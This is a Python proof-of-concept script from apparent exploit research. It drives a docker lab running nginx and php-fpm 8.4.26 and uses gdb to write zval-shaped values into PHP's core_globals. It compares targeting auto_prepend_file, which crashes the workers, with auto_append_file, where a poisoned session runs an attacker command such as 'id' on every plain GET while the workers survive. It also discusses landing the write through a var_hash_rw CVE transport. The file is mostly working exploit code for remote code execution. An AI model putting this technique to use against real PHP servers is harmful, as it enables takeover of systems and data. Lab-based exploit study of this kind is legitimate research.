#!/usr/bin/env python3
"""A/B proof that a 16-byte zval-shaped write lands a CLEAN, worker-surviving PG
dispatch on php-fpm 8.4.26 when aimed at auto_append_file@0xa8 instead of
auto_prepend_file@0xa0.

Stands up (or reuses) the lab (docker-compose.fpm-avenues.yml, profile cw: stock
nginx:8151 -> php-fpm 8.4.26 pm=static max_children=6, no host-published fpm socket)
and proves, over normal HTTP to nginx only:

  P1  derive core_globals + per-worker base; dump PG fields 0xa0..0xd0, confirming
      input_encoding@0xb0 (auto_append's +8 neighbour) is NULL/un-dereferenced.
  P2  WALL: the 16-byte shape at auto_prepend@0xa0 (IS_LONG -> auto_append@0xa8 =
      (char*)4): a plain GET must 502 and kill the serving worker.
  P3  CLEAN: the identical 16-byte shape at auto_append@0xa8 (IS_LONG ->
      input_encoding@0xb0): plain GETs must fire uid=www-data and the workers survive.
  P4  BURST: the full 3-value burst at 0xa8 still survives and fires; read back
      input_encoding@0xb0 == 0x4 to confirm the pollution is present yet harmless.
  P5  honest boundary (faithful 16-byte zval-shape gdb deposit vs a no-gdb transport).

Exit 0 iff the WALL crashes AND the CLEAN write fires uid + survives AND the BURST
survives.
"""
from __future__ import annotations

import argparse
import importlib.util
import os
import subprocess
import sys
import time

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(_HERE))  # poc/
for _p in (_HERE, _POC_ROOT):
    if _p not in sys.path:
        sys.path.insert(0, _p)

_ROOT = os.path.dirname(_POC_ROOT)  # repo root
_COMPOSE = os.path.join(_ROOT, "docker-compose.fpm-avenues.yml")


def _load(name, filename):
    spec = importlib.util.spec_from_file_location(
        name, os.path.join(_HERE, filename))
    mod = importlib.util.module_from_spec(spec)
    sys.modules.setdefault(name, mod)
    spec.loader.exec_module(mod)
    return mod


C = _load("fpm_clean_pg_write", "fpm_clean_pg_write.py")
G = C.G


def _dc(*args, timeout=600):
    return subprocess.run(["docker", "compose", "-f", _COMPOSE,
                           "-p", "p2s-cw", "--profile", "cw", *args],
                          capture_output=True, text=True, timeout=timeout)


from common.labharness import wait_ready  # noqa: E402


def reset_pg(cg, pids):
    """NULL auto_prepend/auto_append/input_encoding on every worker (clean slate)."""
    for pid in pids:
        base = G.fpm_base_of(_COMPOSE, "cw-fpm", pid)
        if base is None:
            continue
        cgb = base + cg
        G._exec(_COMPOSE, "cw-fpm", "gdb", "-p", str(pid), "-batch", "-nx",
                "-ex", f"set {{unsigned long}}{cgb + 0xa0:#x} = 0",
                "-ex", f"set {{unsigned long}}{cgb + 0xa8:#x} = 0",
                "-ex", f"set {{unsigned long}}{cgb + 0xb0:#x} = 0",
                "-ex", f"set {{unsigned long}}{cgb + 0xc0:#x} = 0",
                "-ex", "quit", timeout=60)


def plain_status(host, port, base="/plain.php"):
    """Return (http_status, body_text) for one plain GET."""
    import http.client
    try:
        c = http.client.HTTPConnection(host, port, timeout=10)
        c.request("GET", base)
        r = c.getresponse()
        body = r.read().decode("utf-8", "replace")
        return r.status, body
    except Exception as e:
        return None, f"{type(e).__name__}: {e}"


def pool_pids():
    return set(G.worker_pids(_COMPOSE, "cw-fpm"))


def main(argv=None):
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=8151)
    ap.add_argument("--service", default="cw-fpm")
    ap.add_argument("--cmd", default="id")
    ap.add_argument("--parts", type=int, default=3000)
    ap.add_argument("--no-build", action="store_true")
    ap.add_argument("--keep", action="store_true")
    a = ap.parse_args(argv)

    # grouped-compose isolation for the imported helper module (G).
    os.environ["COMPOSE_FILE"] = _COMPOSE
    os.environ["COMPOSE_PROJECT_NAME"] = "p2s-cw"
    os.environ["COMPOSE_PROFILES"] = "cw"

    sid = "0123456789abcdef0123456789abcdef"
    cf, svc = _COMPOSE, a.service
    brought_up = False
    try:
        # ---- P0 ----
        if not a.no_build:
            print("[P0] docker compose up --build ...")
            r = _dc("up", "-d", "--build")
            if r.returncode != 0:
                print(r.stdout[-800:]); print(r.stderr[-800:])
                print("[P0] FAIL: compose up"); return 2
            brought_up = True
        if not wait_ready(a.host, a.port):
            print(f"[P0] FAIL: plain.php never 200 on {a.host}:{a.port}"); return 2
        print(f"[P0] lab ready: http://{a.host}:{a.port} (fpm NOT published)")

        # ---- P1: core_globals + struct ----
        cg, how = G.derive_core_globals(cf, svc)
        cg = cg or C.CORE_GLOBALS
        pids = G.worker_pids(cf, svc)
        base = G.fpm_base_of(cf, svc, pids[0]) if pids else None
        if not pids or base is None:
            print("[P1] FAIL: no workers / base"); return 2
        print(f"[P1] core_globals={cg:#x} ({how}); base={base:#x}")
        # clear any residual install so the dump shows the true per-request
        # defaults (these fields are NULL on a fresh worker).
        reset_pg(cg, pids)
        fields = C.read_pg_fields(cf, svc, pids[0], base + cg)
        names = {0xa0: "auto_prepend", 0xa8: "auto_append",
                 0xb0: "input_encoding", 0xb8: "internal_encoding",
                 0xc0: "output_encoding", 0xc8: "argsep_output",
                 0xd0: "argsep_input"}
        for off, nm in names.items():
            v = fields.get(f"0x{off:x}")
            print(f"[P1]   +0x{off:02x} {nm:<17} = "
                  f"{'NULL' if v == 0 else (hex(v) if v is not None else '?')}")
        p1_ok = fields.get("0xb0") == 0  # input_encoding NULL => benign neighbour
        print(f"[P1] {'PASS' if p1_ok else 'WARN'}: input_encoding@0xb0 is "
              f"{'NULL (benign +8 neighbour of auto_append)' if p1_ok else 'NON-NULL'}")

        # ---- P2: WALL (16-byte shape at auto_prepend@0xa0) ----
        print("[P2] WALL: var_hash_rw-shape deposit at auto_prepend@0xa0 (IS_LONG -> "
              "auto_append@0xa8 = (char*)4)")
        reset_pg(cg, G.worker_pids(cf, svc))
        sess = G.poison(a.host, a.port, a.cmd, sid, parts=a.parts,
                        base="/plain.php", verbose=False)
        pids = G.worker_pids(cf, svc)
        w_wall = C.ShapeWrite8(cf, svc, burst=False, verbose=False)
        C.install_dirty_autoprepend(base, cg, w_wall, pids, cf, svc, sess)
        before = pool_pids()
        statuses = [plain_status(a.host, a.port)[0] for _ in range(8)]
        after = pool_pids()
        # Multi-worker pool: dirty workers 502 + die; respawned-clean workers
        # serve 200. The WALL signature is "crashes OCCUR + workers die" (vs the
        # CLEAN write in P3, which yields zero 502s and zero deaths).
        n502 = sum(1 for s in statuses if s == 502 or s is None)
        killed = bool(before - after)
        print(f"[P2]   plain GET statuses = {statuses}  ({n502} crash)")
        print(f"[P2]   pool pids before={sorted(before)} after={sorted(after)}")
        p2_ok = n502 >= 1 and killed
        print(f"[P2] {'PASS' if p2_ok else 'FAIL'}: auto_prepend write CRASHES "
              f"requests ({n502}/8 are 502) and KILLS workers (killed={killed})")

        # ---- P3: CLEAN (16-byte shape at auto_append@0xa8) ----
        print("[P3] CLEAN: identical var_hash_rw-shape deposit at auto_append@0xa8 "
              "(IS_LONG -> input_encoding@0xb0, benign)")
        pids = G.worker_pids(cf, svc)
        reset_pg(cg, pids)
        sess = G.poison(a.host, a.port, a.cmd, sid, parts=a.parts,
                        base="/plain.php", verbose=False)
        pids = G.worker_pids(cf, svc)
        w_clean = C.ShapeWrite8(cf, svc, burst=False, verbose=False)
        C.install_clean_autoappend(base, cg, w_clean, pids, cf, svc, sess)
        before = pool_pids()
        fires, outs = 0, []
        for _ in range(6):
            st, body = plain_status(a.host, a.port)
            if C.MARK_S in body:
                fires += 1
                outs.append(G.oracle_output(body.encode()))
        after = pool_pids()
        survived = before == after and len(after) >= 1
        sample = next((o for o in outs if o), "")
        uid_ok = "uid=" in (sample or "")
        p3_ok = fires >= 5 and survived and uid_ok
        print(f"[P3]   fired {fires}/6 plain GETs; sample output={sample!r}")
        print(f"[P3]   pool pids before={sorted(before)} after={sorted(after)} "
              f"-> survived={survived}")
        print(f"[P3] {'PASS' if p3_ok else 'FAIL'}: clean write fires uid on every "
              f"request and the worker survives")

        # ---- P4: full BURST at 0xa8 ----
        print("[P4] BURST: full var_hash_rw 3-value burst at auto_append@0xa8 "
              "(collateral on output_encoding@0xc0 + arg_separator@0xc8/0xd0)")
        pids = G.worker_pids(cf, svc)
        reset_pg(cg, pids)
        sess = G.poison(a.host, a.port, a.cmd, sid, parts=a.parts,
                        base="/plain.php", verbose=False)
        pids = G.worker_pids(cf, svc)
        w_burst = C.ShapeWrite8(cf, svc, burst=True, k2val=0, verbose=False)
        C.install_clean_autoappend(base, cg, w_burst, pids, cf, svc, sess)
        before = pool_pids()
        bfires = sum(1 for _ in range(4)
                     if C.MARK_S in plain_status(a.host, a.port)[1])
        after = pool_pids()
        fld = C.read_pg_fields(cf, svc, (sorted(after) or [pids[0]])[0], base + cg)
        inpenc = fld.get("0xb0")
        p4_ok = bfires >= 3 and before == after
        print(f"[P4]   fired {bfires}/4; input_encoding@0xb0 = "
              f"{hex(inpenc) if inpenc is not None else '?'} (polluted yet benign)")
        print(f"[P4]   pool pids before={sorted(before)} after={sorted(after)}")
        print(f"[P4] {'PASS' if p4_ok else 'FAIL'}: the full var_hash_rw burst shape "
              f"survives and fires")

        # ---- P5: honest boundary ----
        print("[P5] HONEST BOUNDARY")
        print("     - clean-write TARGET GEOMETRY (approach i): auto_append@0xa8,")
        print("       +8 neighbour input_encoding@0xb0 NULL/un-dereferenced. PROVEN")
        print("       transport-independently by the A/B above.")
        print("     - WRITE TRANSPORT here = faithful var_hash_rw-SHAPE deposit (value +")
        print("       IS_LONG@+8), NOT pg_persist's clean 8-byte write; it")
        print("       reproduces the var_hash_rw pollution and shows it is harmless at 0xa8.")
        print("     - the real var_hash_rw CVE transport (no gdb) reaches core_globals on")
        print("       fpm (.bss BELOW the request chunk -> negative-slot write, no")
        print("       forward cap), but LANDING at 0xa8 end-to-end needs the same")
        print("       per-image a_off/copy_off calibration as functable_resolver.py (this")
        print("       lab shot OOMs+respawns without landing -> recalibration gap).")

        ok = p2_ok and p3_ok and p4_ok
        print(f"\n[RESULT] {'PASS' if ok else 'FAIL'}: wall crashes @0xa0; "
              f"clean write @0xa8 {'fires uid + survives' if p3_ok else 'FAILED'}; "
              f"burst {'survives' if p4_ok else 'FAILED'}")
        return 0 if ok else 1
    finally:
        if brought_up and not a.keep:
            print("[cleanup] docker compose down")
            _dc("down", timeout=120)


if __name__ == "__main__":
    raise SystemExit(main())
